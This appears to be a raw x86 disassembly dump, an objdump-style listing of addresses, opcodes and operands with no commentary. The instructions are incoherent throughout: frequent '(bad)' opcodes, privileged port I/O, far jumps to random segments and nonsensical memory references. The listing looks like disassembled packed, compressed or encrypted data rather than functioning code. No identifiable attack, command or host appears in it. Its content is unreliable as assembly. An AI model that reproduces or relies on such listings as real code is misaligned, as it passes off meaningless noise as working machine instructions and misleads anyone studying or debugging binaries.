  419d0a:	jns    0x419cc8
  419d0c:	pop    esi
  419d0d:	pushf  
  419d0e:	in     al,dx
  419d0f:	jge    0x419d41
  419d11:	push   eax
  419d12:	dec    edi
  419d13:	jp     0x419cfe
  419d15:	mov    bl,0x4
  419d17:	pop    eax
  419d18:	sbb    DWORD PTR [ebx-0xd8a319a],edx
  419d1e:	adc    DWORD PTR [ecx-0x68048250],0x31
  419d25:	cmc    
  419d26:	mov    DWORD PTR [ebp+0x61140e96],ebp
  419d2c:	cwde   
  419d2d:	aam    0xa7
  419d2f:	mul    DWORD PTR [edx]
  419d31:	leave  
  419d32:	lods   eax,DWORD PTR ds:[esi]
  419d33:	sbb    al,0x33
  419d35:	(bad)  
  419d36:	sbb    ebx,DWORD PTR [ecx+0x105abeb9]
  419d3c:	(bad)  [esi+0x56]
  419d3f:	dec    edi
  419d40:	aam    0x4e
  419d42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d43:	lods   al,BYTE PTR ds:[esi]
  419d44:	inc    esi
  419d45:	aam    0xf8
  419d47:	pop    ds
  419d48:	pop    edi
  419d49:	das    
  419d4a:	mov    al,0x37
  419d4c:	inc    eax
  419d4d:	mov    ecx,0x85470d4
  419d52:	aas    
  419d53:	or     edx,0xffffffa0
  419d56:	iret   
  419d57:	mov    ebp,0x4a0e6617
  419d5c:	add    al,0xc7
  419d5e:	add    dh,BYTE PTR [eax]
  419d60:	jmp    0x962d:0x4806c84a
  419d67:	xchg   edi,eax
  419d68:	js     0x419d61
  419d6a:	push   edx
  419d6b:	mov    al,ds:0xf4e1da7b
  419d70:	xchg   esi,eax
  419d71:	(bad)  
  419d72:	fild   QWORD PTR [ecx]
  419d74:	sub    DWORD PTR [eax],0x17c3d630
  419d7a:	(bad)  
  419d7b:	(bad)  
  419d7c:	daa    
  419d7d:	sbb    edi,edi
  419d7f:	push   ebp
  419d80:	pop    DWORD PTR [ebp-0x1d]
  419d83:	clc    
  419d84:	sbb    DWORD PTR [esi+ebx*2-0x289e5ccd],edx
  419d8b:	clc    
  419d8c:	cdq    
  419d8d:	adc    BYTE PTR [esi+0x19],ch
  419d90:	lock xchg BYTE PTR [ebp+0x38],bh
  419d94:	jbe    0x419d5f
  419d96:	jae    0x419dd3
  419d98:	mov    al,ds:0xe1c961d1
  419d9d:	add    al,0xdf
  419d9f:	mov    esp,0xc14d7f06
  419da4:	xchg   ebp,eax
  419da5:	(bad)  
  419da6:	fsub   QWORD PTR [ecx-0x4e16fdf8]
  419dac:	jp     0x419df6
  419dae:	inc    esi
  419daf:	ja     0x419db9
  419db1:	cld    
  419db2:	push   esp
  419db3:	repz imul ecx,DWORD PTR [edi],0xfffffff3
  419db7:	sub    al,0x69
  419db9:	les    ebx,FWORD PTR [eax+0x3b93b7cb]
  419dbf:	imul   esi,DWORD PTR [ebp-0x24],0xa7020a95
  419dc6:	adc    BYTE PTR [ebx-0x40b5bc61],al
  419dcc:	arpl   WORD PTR [edx+edi*1-0x47630054],si
  419dd3:	jmp    0x419e25
  419dd5:	lods   eax,DWORD PTR ds:[esi]
  419dd6:	and    BYTE PTR [edx+0x6691f497],0xe
  419ddd:	inc    edx
  419dde:	cmp    bh,BYTE PTR [edx-0x1424e0c0]
  419de4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419de5:	inc    ecx
  419de6:	dec    edi
  419de7:	cld    
  419de8:	loopne 0x419e16
  419dea:	adc    BYTE PTR [ebx-0x3279eb1],ah
  419df0:	inc    edi
  419df1:	fcom   DWORD PTR [edi-0x4a0e0088]
  419df7:	scas   al,BYTE PTR es:[edi]
  419df8:	repnz scas eax,DWORD PTR es:[edi]
  419dfa:	sbb    al,0x55
  419dfc:	call   0xa22b:0x3613683e
  419e03:	es test al,0xcd
  419e06:	add    DWORD PTR [ebx],esp
  419e08:	dec    esp
  419e09:	mov    ebp,DWORD PTR [edi]
  419e0b:	dec    eax
  419e0c:	pusha  
  419e0d:	and    DWORD PTR [ebx+0x32],0xbbcb3f2d
  419e14:	out    dx,eax
  419e15:	rcl    BYTE PTR [esp+ecx*2],0xd8
  419e19:	pop    edi
  419e1a:	push   esi
  419e1b:	sub    esp,DWORD PTR [edi]
  419e1d:	xor    bl,al
  419e1f:	jg     0x419dcc
  419e21:	jbe    0x419e33
  419e23:	retf   
  419e24:	stos   DWORD PTR es:[edi],eax
  419e25:	and    DWORD PTR [eax+0x15],edi
  419e28:	mov    ?,WORD PTR es:[edi-0x581b00a2]
  419e2f:	jmp    0xf789:0x61276cfe
  419e36:	mov    ah,BYTE PTR [esi-0x474d0d25]
  419e3c:	or     DWORD PTR [edx-0x6c3d2d64],0x5433f7a6
  419e46:	or     esi,DWORD PTR [ebx]
  419e48:	(bad)  
  419e49:	xlat   BYTE PTR ds:[ebx]
  419e4a:	mov    dl,cl
  419e4c:	daa    
  419e4d:	(bad)  
  419e4e:	repz bnd jne 0x419e88
  419e52:	xchg   ebx,eax
  419e53:	mov    bl,0xe1
  419e55:	stos   BYTE PTR es:[edi],al
  419e56:	int    0xf0
  419e58:	outs   dx,BYTE PTR ds:[esi]
  419e59:	jns    0x419ed6
  419e5b:	aam    0x6f
  419e5d:	iret   
  419e5e:	in     al,dx
  419e5f:	and    al,0x36
  419e61:	pop    eax
  419e62:	scas   eax,DWORD PTR es:[edi]
  419e63:	ins    DWORD PTR es:[edi],dx
  419e64:	in     al,dx
  419e65:	mov    ds:0x803ab205,al
  419e6a:	add    DWORD PTR [ecx-0x3c],esp
  419e6d:	push   0xb5063d77
  419e72:	outs   dx,BYTE PTR ds:[esi]
  419e73:	mov    bl,BYTE PTR [esi-0x6a2c461]
  419e79:	ss pop edx
  419e7b:	test   DWORD PTR [eax],ebp
  419e7d:	iret   
  419e7e:	test   DWORD PTR [esi-0x5ae1ae4a],0xf24c9aad
  419e88:	rcl    DWORD PTR [edx+edi*4],cl
  419e8b:	push   ds
  419e8c:	pusha  
  419e8d:	xchg   edi,eax
  419e8e:	test   eax,0xc3ba1a22
  419e93:	ds lahf 
  419e95:	in     al,0xca
  419e97:	mov    cl,0x5e
  419e99:	mov    ds:0x1c105815,al
  419e9e:	push   cs
  419e9f:	mov    ds:0xbe4c961e,eax
  419ea4:	jmp    0x632275bc
  419ea9:	aad    0x5d
  419eab:	out    0x52,eax
  419ead:	dec    edi
  419eae:	fisub  WORD PTR [ebx+0x7]
  419eb1:	sub    ebp,edx
  419eb3:	test   eax,0xd1b746bc
  419eb8:	or     BYTE PTR [eax+0x64],dl
  419ebb:	mov    eax,DWORD PTR ds:0xa06a76f0
  419ec1:	push   es
  419ec2:	jl     0x419f07
  419ec4:	int3   
  419ec5:	xchg   ebx,eax
  419ec6:	xor    cl,BYTE PTR [eax-0x5bd4ded6]
  419ecc:	sub    BYTE PTR [eax+0x24],0x4f
  419ed0:	push   0x79466cd6
  419ed5:	or     dl,ah
  419ed7:	pop    ss
  419ed8:	xlat   BYTE PTR ds:[ebx]
  419ed9:	ins    DWORD PTR es:[edi],dx
  419eda:	ret    0xc57e
  419edd:	cmp    DWORD PTR [edi],ebp
  419edf:	cmp    BYTE PTR [edi-0x14d09138],ch
  419ee5:	pop    ss
  419ee6:	popf   
  419ee7:	imul   ebp,DWORD PTR [eax],0xb2babcbc
  419eed:	scas   al,BYTE PTR es:[edi]
  419eee:	inc    edi
  419eef:	lea    edi,[edx]
  419ef1:	add    DWORD PTR [ebp+0x43],0xa7a87b63
  419ef8:	not    ebx
  419efa:	jmp    0xad2579d8
  419eff:	pop    esi
  419f00:	mov    WORD PTR [esi+0x1031012b],ds
  419f06:	push   edi
  419f07:	sub    BYTE PTR [ebx],bl
  419f09:	inc    edx
  419f0a:	lods   eax,DWORD PTR ds:[esi]
  419f0b:	inc    esp
  419f0c:	add    al,0xac
  419f0e:	cmp    ecx,DWORD PTR [eax]
  419f10:	outs   dx,DWORD PTR ds:[esi]
  419f11:	gs mov eax,0xe4b0b8b8
  419f17:	or     DWORD PTR [edx-0x40],esi
  419f1a:	adc    eax,0xdb2a61b4
  419f1f:	outs   dx,DWORD PTR ds:[esi]
  419f20:	mov    ds:0x182acee,eax
  419f25:	clc    
  419f26:	in     eax,0xd1
  419f28:	loop   0x419f4c
  419f2a:	xor    cl,ah
  419f2c:	aad    0xc3
  419f2e:	test   BYTE PTR ds:0x8e9a5e5,0x93
  419f35:	mov    al,dl
  419f37:	clc    
  419f38:	js     0x419ece
  419f3a:	cli    
  419f3b:	and    ecx,DWORD PTR [edx]
  419f3d:	not    edi
  419f3f:	ss push ebp
  419f41:	lock lea eax,[edx]
  419f44:	stc    
  419f45:	leave  
  419f46:	and    al,BYTE PTR [edi+0x71130166]
  419f4c:	stos   BYTE PTR es:[edi],al
  419f4d:	pusha  
  419f4e:	test   al,0xea
  419f50:	test   al,0x1f
  419f52:	xor    bl,BYTE PTR [eax+0x3af42c4f]
  419f58:	push   0x25c6daa7
  419f5d:	bound  esi,QWORD PTR [edi+0x12]
  419f60:	jecxz  0x419f53
  419f62:	fst    QWORD PTR [eax+edi*2-0x5e]
  419f66:	arpl   bx,di
  419f68:	adc    ebp,DWORD PTR [eax]
  419f6a:	imul   esp,DWORD PTR [ebp+0x31],0xefab8a60
  419f71:	les    esi,FWORD PTR [bx+si]
  419f74:	add    dl,BYTE PTR [edi-0x36]
  419f77:	jb     0x419efb
  419f79:	mov    ebx,0xdd9df3fc
  419f7e:	cdq    
  419f7f:	loope  0x419f47
  419f81:	fwait
  419f82:	xor    al,0xd3
  419f84:	cdq    
  419f85:	fld    DWORD PTR [edi+eax*2-0x15]
  419f89:	pop    esp
  419f8a:	test   al,0x28
  419f8c:	fisubr WORD PTR [ebx-0x786d3fcd]
  419f92:	jecxz  0x419f60
  419f94:	or     eax,0x56a3588d
  419f99:	(bad)  
  419f9a:	mov    cs,WORD PTR [edi-0x5e]
  419f9d:	adc    ecx,DWORD PTR [ecx+eiz*4-0x6c2886d3]
  419fa4:	hlt    
  419fa5:	or     eax,0xd65e581a
  419faa:	sbb    DWORD PTR [esi+ebx*4-0x5cf2e24d],eax
  419fb1:	mov    ebp,0xe771a5d4
  419fb6:	outs   dx,BYTE PTR ds:[esi]
  419fb7:	xchg   edi,eax
  419fb8:	or     al,0x67
  419fba:	enter  0x93c3,0xc4
  419fbe:	mov    ds:0x64e72907,al
  419fc3:	ucomiss xmm1,DWORD PTR [ebp-0x9]
  419fc7:	fldl2t 
  419fc9:	jmp    0x419f8f
  419fcb:	retf   
  419fcc:	loope  0x41a00b
  419fce:	jnp    0x41a034
  419fd0:	sahf   
  419fd1:	outs   dx,DWORD PTR ds:[esi]
  419fd2:	inc    edx
  419fd3:	or     DWORD PTR [ecx-0x23],0xffffff9f
  419fd7:	jg     0x419f61
  419fd9:	push   esp
  419fda:	pop    es
  419fdb:	div    DWORD PTR [esi-0x5cba0475]
  419fe1:	retf   0xba68
  419fe4:	cmp    eax,0x448b1252
  419fe9:	das    
  419fea:	enter  0xee89,0x8
  419fee:	and    dh,cl
  419ff0:	push   ds
  419ff1:	jns    0x419faa
  419ff3:	mov    ebx,0xd3962b78
  419ff8:	into   
  419ff9:	lahf   
  419ffa:	les    edx,FWORD PTR [eax+ebp*4-0x3c9c2e67]
  41a001:	mov    ds:0xa9717492,al
  41a006:	push   esi
  41a007:	shl    DWORD PTR [eax+eax*4],0x43
  41a00b:	mov    ebp,0x7a3c988a
  41a010:	pushw  es
  41a012:	push   esi
  41a013:	in     eax,0x48
  41a015:	or     esi,DWORD PTR [edx-0x3a]
  41a018:	xor    dh,BYTE PTR ds:0x4400a6b5
  41a01e:	pushf  
  41a01f:	jge    0x41a090
  41a021:	bound  edi,QWORD PTR es:[ebp-0x66aceb2b]
  41a028:	jae    0x41a092
  41a02a:	ss or  esp,0x6c652d57
  41a031:	sbb    BYTE PTR ds:0x15c44e7c,ch
  41a037:	icebp  
  41a038:	mov    dh,0x50
  41a03a:	sbb    DWORD PTR [edx],ebp
  41a03c:	std    
  41a03d:	es or  ebx,ecx
  41a040:	pop    ebx
  41a041:	sbb    eax,0x9f302129
  41a046:	or     BYTE PTR [esi+0x1bd9535f],bl
  41a04c:	sbb    esp,0xffffffea
  41a04f:	and    ch,BYTE PTR [ebx]
  41a051:	adc    BYTE PTR [eax-0x63],bl
  41a054:	out    0x48,eax
  41a056:	jmp    0xf2d4ccd0
  41a05b:	xlat   BYTE PTR ds:[ebx]
  41a05c:	cdq    
  41a05d:	aad    0xfe
  41a05f:	gs inc esi
  41a061:	in     al,0xf6
  41a063:	js     0x41a039
  41a065:	ja     0x41a0c9
  41a067:	sbb    al,0x12
  41a069:	inc    eax
  41a06a:	jmp    0x3c65:0x8c2b791e
  41a071:	cdq    
  41a072:	data16 out 0x62,al
  41a075:	es sti 
  41a077:	loope  0x41a0f1
  41a079:	bound  ecx,QWORD PTR [edx]
  41a07b:	sub    BYTE PTR [eax-0x4cd87503],ch
  41a081:	xchg   esi,eax
  41a082:	xchg   ebp,eax
  41a083:	mov    bl,0x31
  41a085:	xchg   BYTE PTR [eax+0x61],al
  41a088:	and    eax,0xc44c9e36
  41a08d:	jg     0x41a0b0
  41a08f:	mov    ecx,0x664ca984
  41a094:	push   0x77
  41a096:	dec    ebp
  41a097:	inc    edi
  41a098:	inc    esi
  41a099:	jecxz  0x41a083
  41a09b:	and    al,0x6
  41a09d:	mov    cl,0x36
  41a09f:	cmp    edx,DWORD PTR [esi-0x7d]
  41a0a2:	adc    BYTE PTR [esi+eiz*2-0x1d1906a],al
  41a0a9:	enter  0x36d7,0xbe
  41a0ad:	cwde   
  41a0ae:	sub    BYTE PTR [eax+esi*8+0x4a],cl
  41a0b2:	into   
  41a0b3:	repz mov edi,0x20b2e382
  41a0b9:	loop   0x41a09a
  41a0bb:	sub    eax,DWORD PTR [edi-0x5b]
  41a0be:	addr16 push edx
  41a0c0:	add    BYTE PTR [edx],bl
  41a0c2:	out    0x9b,eax
  41a0c4:	fadd   st(1),st
  41a0c6:	rep stos DWORD PTR es:[edi],eax
  41a0c8:	pop    esp
  41a0c9:	jno    0x41a083
  41a0cb:	jecxz  0x41a0bf
  41a0cd:	(bad)  
  41a0ce:	cmp    BYTE PTR [ecx-0x34c7305c],ch
  41a0d4:	ins    BYTE PTR es:[edi],dx
  41a0d5:	leave  
  41a0d6:	in     eax,0xb2
  41a0d8:	leave  
  41a0d9:	(bad)  
  41a0da:	popa   
  41a0db:	bound  ebp,QWORD PTR [esi+ecx*8-0x43]
  41a0df:	pop    ebp
  41a0e0:	ins    BYTE PTR es:[edi],dx
  41a0e1:	mov    ss,ebx
  41a0e3:	out    0xf3,eax
  41a0e5:	and    edx,DWORD PTR [ebx+0x48afc9f]
  41a0eb:	adc    DWORD PTR [edx+0x72],ebp
  41a0ee:	aaa    
  41a0ef:	push   edx
  41a0f0:	mov    ah,BYTE PTR [ebx+0xb]
  41a0f3:	aad    0xc5
  41a0f5:	and    eax,0xb61fc5f8
  41a0fa:	and    edx,ebp
  41a0fc:	xor    BYTE PTR [ecx-0x5f],dl
  41a0ff:	push   ecx
  41a100:	or     al,0x47
  41a102:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a103:	mov    ch,BYTE PTR [eax-0x65]
  41a106:	clc    
  41a107:	jmp    0x5a9c:0xa7710d52
  41a10e:	pop    ecx
  41a10f:	test   DWORD PTR [edi],0x9d8ede1e
  41a115:	mov    dh,0x7
  41a117:	lahf   
  41a118:	push   edi
  41a119:	retf   0x9c0d
  41a11c:	stos   BYTE PTR es:[edi],al
  41a11d:	xor    DWORD PTR [edx-0x66fd04a9],0xffffffb7
  41a124:	hlt    
  41a125:	add    ch,dl
  41a127:	sbb    bl,dh
  41a129:	xchg   DWORD PTR [edx+0x31fb0de9],edi
  41a12f:	adc    al,0x1a
  41a131:	out    0x2c,al
  41a133:	push   0xa066d342
  41a138:	xor    BYTE PTR [ecx*1+0x16672dd],0xd9
  41a140:	xchg   DWORD PTR [eax],ecx
  41a142:	rcl    ch,cl
  41a144:	and    ebp,DWORD PTR [eax-0x1d]
  41a147:	jo     0x41a1a6
  41a149:	shl    DWORD PTR [esi],0xa8
  41a14c:	xchg   BYTE PTR [esi],dh
  41a14e:	jo     0x41a157
  41a150:	int3   
  41a151:	inc    eax
  41a152:	test   DWORD PTR [esp+edi*1+0x716e79e4],eax
  41a159:	mov    bh,0x22
  41a15b:	mov    ah,0xe1
  41a15d:	out    0xe8,eax
  41a15f:	cmp    eax,0xa11a2b81
  41a164:	mov    bl,0xea
  41a166:	ss pop ecx
  41a168:	mov    edx,0x90780668
  41a16d:	pop    esi
  41a16e:	sar    DWORD PTR [esi+0x4d],0xca
  41a172:	test   DWORD PTR [esi],eax
  41a174:	scas   eax,DWORD PTR es:[edi]
  41a175:	cmp    ch,BYTE PTR [edi+0x7ca70e71]
  41a17b:	lea    edx,[ecx+0x6b]
  41a17e:	retf   0xbed4
  41a181:	mov    eax,ds:0x236db612
  41a186:	scas   al,BYTE PTR es:[edi]
  41a187:	stc    
  41a188:	push   edi
  41a189:	(bad)  
  41a18a:	fldcw  WORD PTR [esi]
  41a18c:	push   ebx
  41a18d:	mov    esp,0x29b78012
  41a192:	sbb    dl,BYTE PTR [edi]
  41a194:	retf   
  41a195:	add    al,0x45
  41a197:	repnz push eax
  41a199:	(bad)  
  41a19a:	aas    
  41a19b:	xchg   DWORD PTR [edi-0x25],esp
  41a19e:	sub    ch,BYTE PTR [ebx]
  41a1a0:	inc    edi
  41a1a1:	xlat   BYTE PTR ds:[ebx]
  41a1a2:	mov    ch,0xcf
  41a1a4:	jnp    0x41a19d
  41a1a6:	or     edi,DWORD PTR [edi+0x69]
  41a1a9:	lods   al,BYTE PTR ds:[esi]
  41a1aa:	aas    
  41a1ab:	popf   
  41a1ac:	and    al,0xd5
  41a1ae:	xchg   edi,eax
  41a1af:	xchg   ebx,eax
  41a1b0:	mov    ch,0xe3
  41a1b2:	add    DWORD PTR [eax-0x238a72a3],ebx
  41a1b8:	sbb    eax,edi
  41a1ba:	stc    
  41a1bb:	nop    DWORD PTR [edx+ebp*1-0x41]
  41a1c0:	sub    DWORD PTR [ecx+0x7a86c54d],ebp
  41a1c6:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1c8:	enter  0x240b,0xd3
  41a1cc:	lahf   
  41a1cd:	es pop edi
  41a1cf:	mov    bl,0xa9
  41a1d1:	outs   dx,BYTE PTR ds:[esi]
  41a1d2:	pop    ebp
  41a1d3:	fimul  WORD PTR [ecx-0x3f]
  41a1d6:	adc    edi,ebx
  41a1d8:	(bad)  
  41a1d9:	or     cl,dh
  41a1db:	push   esp
  41a1dc:	inc    esp
  41a1dd:	adc    al,0xc1
  41a1df:	ins    BYTE PTR es:[edi],dx
  41a1e0:	iret   
  41a1e1:	or     DWORD PTR [eax-0x7e12ffe6],esp
  41a1e7:	jno    0x41a221
  41a1e9:	iret   
  41a1ea:	mov    esp,0x2830b1b5
  41a1ef:	xor    DWORD PTR [ebx+0x798e1765],edi
  41a1f5:	pop    es
  41a1f6:	retf   0x4c45
  41a1f9:	push   ebp
  41a1fa:	(bad)
  41a1fd:	aam    0xd4
  41a1ff:	mov    bl,0x6c
  41a201:	gs mov ch,0x98
  41a204:	data16 fwait
  41a206:	add    eax,0x3605099e
  41a20b:	jmp    0x640:0x9f79f547
  41a212:	test   DWORD PTR [ebx-0x16f80811],esi
  41a218:	sbb    eax,0x80522924
  41a21d:	cmp    eax,DWORD PTR [eax+0x766a75d5]
  41a223:	cld    
  41a224:	pop    ebp
  41a225:	inc    ecx
  41a226:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a227:	inc    ebx
  41a228:	xchg   edi,eax
  41a229:	cld    
  41a22a:	dec    edx
  41a22b:	pop    es
  41a22c:	mov    ebp,edi
  41a22e:	and    DWORD PTR [ebp+0x5f],esi
  41a231:	test   eax,0xc6043071
  41a236:	fsubr  DWORD PTR [ebp-0x64]
  41a239:	and    ah,bh
  41a23b:	inc    ebx
  41a23c:	das    
  41a23d:	hlt    
  41a23e:	js     0x41a297
  41a240:	xchg   edi,eax
  41a241:	push   ss
  41a242:	es lahf 
  41a244:	jno    0x41a205
  41a246:	jbe    0x41a29c
  41a248:	mov    dh,0x56
  41a24a:	adc    DWORD PTR [ebp-0x27f777a5],ebx
  41a250:	fcomp  QWORD PTR [ebx-0x757a6355]
  41a256:	xchg   ebx,eax
  41a257:	pop    ss
  41a258:	in     eax,0xf1
  41a25a:	lock in al,dx
  41a25c:	cdq    
  41a25d:	mov    WORD PTR [ecx],?
  41a25f:	test   BYTE PTR [ecx+0x2f750682],dl
  41a265:	pop    esp
  41a266:	dec    ebx
  41a267:	test   BYTE PTR [ecx-0x1c],dl
  41a26a:	cmc    
  41a26b:	stos   BYTE PTR es:[edi],al
  41a26c:	push   ebx
  41a26d:	xchg   DWORD PTR ds:0x4d3f2f0e,eax
  41a273:	pop    esp
  41a274:	sahf   
  41a275:	ficom  WORD PTR [ebp+0x5]
  41a278:	xchg   BYTE PTR [eax-0x78a115f],dl
  41a27e:	xor    edx,DWORD PTR fs:[edi]
  41a281:	mov    ebx,0xd2b36ea1
  41a286:	jnp    0x41a20f
  41a288:	bound  esp,QWORD PTR [ecx]
  41a28a:	mov    dl,0x54
  41a28c:	jp     0x41a22a
  41a28e:	dec    ebp
  41a28f:	call   0xe70c:0x72fedd54
  41a296:	test   BYTE PTR [edi+0x18],al
  41a299:	jae    0x41a2a9
  41a29b:	mov    ebp,0x5f24b9d9
  41a2a0:	adc    DWORD PTR [esi-0x382a52e1],ebx
  41a2a6:	jp     0x41a268
  41a2a8:	lock jmp 0x41a285
  41a2ab:	out    dx,eax
  41a2ac:	mov    eax,ds:0x113680a0
  41a2b1:	add    BYTE PTR [ebx+0xc424f0f],bh
  41a2b7:	sub    eax,0x3b3b34ce
  41a2bc:	enter  0x108a,0x9b
  41a2c0:	stos   DWORD PTR es:[edi],eax
  41a2c1:	and    edx,DWORD PTR [ebp+0x6]
  41a2c4:	ret    0xcf2
  41a2c7:	hlt    
  41a2c8:	in     al,0xfe
  41a2ca:	push   esi
  41a2cb:	lods   eax,DWORD PTR ds:[esi]
  41a2cc:	sbb    BYTE PTR [edi+0x7379da3b],dh
  41a2d2:	es push esp
  41a2d4:	jo     0x41a2f2
  41a2d6:	and    ah,BYTE PTR [ebp-0xfd6b304]
  41a2dc:	jns    0x41a31c
  41a2de:	fild   QWORD PTR [edi-0x478e5f4c]
  41a2e4:	sti    
  41a2e5:	add    eax,0xdbdad087
  41a2ea:	lods   eax,DWORD PTR ds:[esi]
  41a2eb:	or     eax,0x2c8e8e6c
  41a2f0:	repnz mov esp,0x3563c8b3
  41a2f6:	shr    DWORD PTR [ecx],0xc8
  41a2f9:	sti    
  41a2fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2fb:	inc    esi
  41a2fc:	cmp    al,0xd8
  41a2fe:	in     al,0x52
  41a300:	dec    edx
  41a301:	loope  0x41a342
  41a303:	inc    ebx
  41a304:	pusha  
  41a305:	dec    ecx
  41a306:	or     eax,DWORD PTR [ebx+0x60]
  41a309:	sbb    BYTE PTR [eax],cl
  41a30b:	mov    esp,0xf85c7f77
  41a310:	neg    BYTE PTR [eax+0x648f4253]
  41a316:	sub    BYTE PTR ds:0x2bebedf8,cl
  41a31c:	pop    ds
  41a31d:	pop    ebp
  41a31e:	mov    ds:0x7dae6ac8,eax
  41a323:	imul   esi,ebp,0x2f
  41a326:	pop    ecx
  41a327:	(bad)  
  41a328:	jbe    0x41a329
  41a32a:	(bad)  
  41a32b:	in     al,0x8a
  41a32d:	inc    edi
  41a32e:	adc    DWORD PTR [edx-0x57c95d13],edx
  41a334:	mov    ds:0x6919699c,al
  41a339:	ror    DWORD PTR [ecx+0x3973f92d],1
  41a33f:	xchg   DWORD PTR [eax],edx
  41a341:	ret    
  41a342:	jge    0x41a31a
  41a344:	(bad)  
  41a345:	dec    ecx
  41a346:	ss out 0xb2,al
  41a349:	push   ss
  41a34a:	out    0x82,al
  41a34c:	or     DWORD PTR [esi+ebx*4-0x30],ebx
  41a350:	adc    eax,0xfd167c17
  41a355:	cli    
  41a356:	adc    DWORD PTR [ecx+0x40f369d1],edx
  41a35c:	xchg   edx,eax
  41a35d:	sbb    al,0x6e
  41a35f:	fdivr  DWORD PTR gs:[eax+ebx*2+0x57]
  41a364:	mov    ch,0xa3
  41a366:	lahf   
  41a367:	sbb    eax,0x604c8bd4
  41a36c:	std    
  41a36d:	push   edi
  41a36e:	xchg   esi,eax
  41a36f:	xchg   esi,eax
  41a370:	pop    ebx
  41a371:	pop    es
  41a372:	icebp  
  41a373:	push   ds
  41a374:	rcr    ebp,1
  41a376:	jae    0x41a3d7
  41a378:	pop    ebp
  41a379:	dec    ecx
  41a37a:	rcr    ecx,0x8b
  41a37d:	pop    eax
  41a37e:	dec    esi
  41a37f:	sub    eax,0xd6d45402
  41a384:	push   ebx
  41a385:	inc    esp
  41a386:	sbb    eax,0xb7abcbd8
  41a38b:	(bad)  
  41a38c:	sub    ah,BYTE PTR [ebx+0x4668886d]
  41a392:	lahf   
  41a393:	popa   
  41a394:	inc    esi
  41a395:	(bad)  
  41a396:	mov    cl,0x52
  41a398:	enter  0xba35,0x2
  41a39c:	or     al,0xee
  41a39e:	div    eax
  41a3a0:	rcl    BYTE PTR [ebx],1
  41a3a2:	xor    ecx,DWORD PTR [ecx]
  41a3a4:	jp     0x41a41e
  41a3a6:	lock adc dh,BYTE PTR [di]
  41a3aa:	cld    
  41a3ab:	and    eax,0x210cdf59
  41a3b0:	sbb    esp,edx
  41a3b2:	ins    BYTE PTR es:[edi],dx
  41a3b3:	xchg   esi,eax
  41a3b4:	sbb    bh,BYTE PTR [eax]
  41a3b6:	and    BYTE PTR [esi+0x58],al
  41a3b9:	es dec esi
  41a3bb:	adc    eax,0x23f95a63
  41a3c0:	arpl   WORD PTR [ecx+0x3181fc82],dx
  41a3c6:	cdq    
  41a3c7:	push   ebp
  41a3c8:	ja     0x41a391
  41a3ca:	mov    eax,ds:0x619e18f9
  41a3cf:	xchg   esi,eax
  41a3d0:	vorps  xmm6,xmm6,XMMWORD PTR [ecx+0x3e]
  41a3d5:	inc    ebp
  41a3d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3d7:	repnz push cs
  41a3d9:	loopne 0x41a41c
  41a3db:	mov    bh,ch
  41a3dd:	aad    0x23
  41a3df:	outs   dx,DWORD PTR ds:[esi]
  41a3e0:	sti    
  41a3e1:	shr    DWORD PTR [edi-0x43],1
  41a3e4:	pop    ss
  41a3e5:	mov    esi,eax
  41a3e7:	ret    0xe7b5
  41a3ea:	xor    bh,BYTE PTR [edi]
  41a3ec:	sahf   
  41a3ed:	popa   
  41a3ee:	fimul  WORD PTR [ecx-0x54]
  41a3f1:	sbb    ebx,DWORD PTR [edx+0x1a3ef3af]
  41a3f7:	in     eax,0x52
  41a3f9:	mov    bl,0x1c
  41a3fb:	inc    edx
  41a3fc:	push   es
  41a3fd:	retf   0x8f44
  41a400:	lea    esi,[ecx-0x6854ece6]
  41a406:	pop    ebx
  41a407:	xchg   DWORD PTR [ebp-0x57],esi
  41a40a:	sub    DWORD PTR [esi+0x503b10a9],edx
  41a410:	dec    ecx
  41a411:	dec    ebp
  41a412:	imul   ecx,DWORD PTR [eax],0x1ab04a5c
  41a418:	jecxz  0x41a3e4
  41a41a:	aaa    
  41a41b:	test   BYTE PTR [ecx],dl
  41a41d:	ret    
  41a41e:	ror    DWORD PTR [edi],0xe2
  41a421:	add    ecx,esp
  41a423:	mul    DWORD PTR [ecx+esi*4+0x4cc68a7e]
  41a42a:	out    0x9b,eax
  41a42c:	dec    esi
  41a42d:	sbb    dh,BYTE PTR [edi+0x44]
  41a430:	sub    ah,BYTE PTR [eax]
  41a432:	xor    eax,0x9d3403c7
  41a437:	iret   
  41a438:	or     esp,edi
  41a43a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a43b:	adc    eax,0xe5609277
  41a440:	add    al,0x18
  41a442:	and    dh,BYTE PTR [esi-0x3f]
  41a445:	or     DWORD PTR [edx],esp
  41a447:	(bad)  
  41a448:	or     ebx,esi
  41a44a:	stos   BYTE PTR es:[edi],al
  41a44b:	mov    bl,0xab
  41a44d:	mov    edx,0x9571bf3c
  41a452:	mov    al,0xfb
  41a454:	sbb    BYTE PTR [ecx],bh
  41a456:	daa    
  41a457:	popa   
  41a458:	outs   dx,BYTE PTR ds:[esi]
  41a459:	or     DWORD PTR ds:0x71e32674,edx
  41a45f:	pop    edx
  41a460:	bound  edi,QWORD PTR [ebx-0x33]
  41a463:	jo     0x41a3e6
  41a465:	fsubr  DWORD PTR [edi+edi*4]
  41a468:	sub    esp,0x8350bcd5
  41a46e:	xchg   edx,eax
  41a46f:	xor    eax,0xd3b43c33
  41a474:	pushf  
  41a475:	and    DWORD PTR [edi-0x69],ecx
  41a478:	push   edi
  41a479:	std    
  41a47a:	dec    edx
  41a47b:	mov    dh,0x84
  41a47d:	mov    cl,0xbd
  41a47f:	iret   
  41a480:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a481:	cmp    BYTE PTR [eax+eiz*8+0x5b8ba032],0x7a
  41a489:	(bad)  
  41a48a:	xchg   ebx,eax
  41a48b:	pop    ss
  41a48c:	mov    al,0x92
  41a48e:	cmp    al,0x34
  41a490:	jb     0x41a425
  41a492:	cmp    BYTE PTR [edx+0x37],bh
  41a495:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a496:	push   0x6e
  41a498:	data16 idiv BYTE PTR ss:[edx-0x1aea9b30]
  41a4a0:	repnz rcl dl,1
